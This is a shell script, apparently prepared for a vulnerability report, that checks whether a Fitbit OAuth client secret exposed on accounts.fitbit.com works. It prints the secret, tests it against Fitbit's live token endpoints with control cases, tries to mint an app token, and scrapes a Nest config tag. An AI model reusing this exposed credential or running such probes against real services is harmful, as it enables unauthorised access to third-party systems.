#!/data/data/com.termux/files/usr/bin/bash
# g-probe5.sh — verify the SECOND credential, the one on accounts.fitbit.com.
# Same three-way differential. Nothing is assumed because the first one was real.
set -u
echo "######################################################################"
echo "# accounts.fitbit.com publishes a ready-made Basic header             #"
echo "######################################################################"
echo '  "basicToken":"MjI4VFFEOjc2NTlmOWQ5ZWNjOTJkNmRjMWVlMGQxNzc0ZTk3NDRh"'
echo "   base64 -d  ->  228TQD:7659f9d9ecc92d6dc1ee0d1774e9744a"
echo
echo "  accounts.fitbit.com is Fitbit's LOGIN host and is TIER1 in Google's own"
echo "  acquisitions list. Verify it exactly as the first one was verified."
echo

ID2=228TQD; SEC2=7659f9d9ecc92d6dc1ee0d1774e9744a
try() { # try <label> <id> <secret> <endpoint>
  b=$(printf '%s:%s' "$2" "$3" | base64 -w0 2>/dev/null || printf '%s:%s' "$2" "$3" | base64)
  printf '  %-40s ' "$1"
  curl -s --max-time 12 -X POST "$4" \
    -H "Authorization: Basic $b" -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'grant_type=authorization_code&code=ZZZINVALIDCODE7x2&redirect_uri=https://example.com/' \
    -w ' [HTTP %{http_code}]\n' | tr -d '\n' | head -c 300; echo
  sleep 1.5
}
E=https://api.fitbit.com/oauth2/token
try "[TEST]     228TQD + published secret" "$ID2" "$SEC2" "$E"
try "[CONTROL]  228TQD + WRONG secret"     "$ID2" "0000000000000000000000000000dead" "$E"
try "[SENTINEL] fake id + fake secret"     "ZZZZZZ" "0000000000000000000000000000dead" "$E"

echo
echo "  --- does it also mint an app token? (no user, no API call afterwards) ---"
b=$(printf '%s:%s' "$ID2" "$SEC2" | base64 -w0 2>/dev/null || printf '%s:%s' "$ID2" "$SEC2" | base64)
printf '  client_credentials   '
curl -s --max-time 12 -X POST "$E" -H "Authorization: Basic $b" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials' \
  -w ' [HTTP %{http_code}]\n' | tr -d '\n' | head -c 300; echo
sleep 1.5

echo
echo "  --- the OTHER endpoint snapdragon-ws named: web-api.fitbit.com ---"
printf '  web-api, TEST creds   '
curl -s --max-time 12 -X POST "https://web-api.fitbit.com/oauth2/token" -H "Authorization: Basic $b" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials' \
  -w ' [HTTP %{http_code}]\n' | tr -d '\n' | head -c 250; echo

echo
echo "######################################################################"
echo "# myaccount.nest.com also ships a config meta — read it              #"
echo "######################################################################"
curl -s --max-time 10 https://myaccount.nest.com/ \
  | grep -oE 'content="%7B[^"]{40,}"' | head -1 | sed 's/content="//;s/"$//' \
  | python3 -c "import sys,urllib.parse,json
raw=urllib.parse.unquote(sys.stdin.read())
try: print(json.dumps(json.loads(raw),indent=1)[:2500])
except Exception: print(raw[:2500])" 2>/dev/null

echo
echo "######################################################################"
echo "# evidence block for the report — timestamp, IP, tool version        #"
echo "######################################################################"
date -u '+  UTC time : %Y-%m-%d %H:%M:%S'
printf '  tester IP: '; curl -s --max-time 8 ifconfig.me; echo
printf '  curl     : '; curl --version | head -1
